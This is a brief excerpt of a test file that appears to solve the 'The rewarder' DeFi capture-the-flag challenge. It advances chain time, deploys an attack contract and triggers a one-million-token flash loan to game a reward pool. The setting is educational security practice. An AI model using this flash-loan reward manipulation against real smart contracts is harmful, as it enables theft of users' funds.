...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
        const t = await ethers.getContractFactory('TheRewarderAttack', attacker);
        const Attack = await t.deploy(this.liquidityToken.address,this.rewarderPool.address,this.flashLoanPool.address,this.rewardToken.address);  
        await Attack.connect(attacker).flashLoan(ethers.utils.parseEther('1000000'));       
    });
